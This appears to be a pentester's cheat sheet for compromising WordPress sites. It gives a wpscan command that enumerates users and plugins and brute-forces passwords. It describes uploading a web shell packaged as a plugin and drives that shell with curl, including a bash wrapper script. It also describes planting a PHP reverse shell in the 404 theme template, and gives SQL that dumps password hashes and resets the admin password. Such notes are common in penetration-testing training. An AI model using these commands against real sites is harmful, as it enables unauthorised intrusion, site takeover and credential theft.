#### WPSSCAN

```
wpscan -e ap,at,tt,cb,dbe,u,m --url http://$IP --plugins-detection mixed --passwords /usr/share/seclists/Passwords/probable-v2-top12000.txt | tee scans/wpscan.out
```

#### Plugin RCE

```
cd /usr/share/seclists/Web-Shells/WordPress
ls  # plugin-shell.php
head plugin-shell.php
```
```
#  file is named plugin-shell.zip and will be placed in the plugin-shell folder within wp-content/plugins on the server
sudo zip plugin-shell.zip plugin-shell.php
```

Plugins -> add new -> upload

```
curl http://$IP/wp-content/plugins/plugin-shell/plugin-shell.php?cmd=whoami
# www-data
```

Automate curl :
```
#!/bin/bash
# -G is necessary to append the data to the URL.
curl -G --data-urlencode "cmd=$1" "http://$IP/wp-content/plugins/plugin-shell/plugin-shell.php" --output -
```

#### Panel RCE

Appearance -> Editor -> 404 Template (at the right) -> Paste php-reverse-shell.php (Edit lhost and lport) -> Update File

```
http://$IP/wp-content/themes/<theme_name>/404.php
```

#### Other info

- Access credentials in wordpres db : SELECT user_login, user_pass FROM wp_users

- Config file is : wp-config.php

- Update wordpress password from mysql : UPDATE wp_users SET user_pass=MD5('newPassword') WHERE user_login = 'admin'; 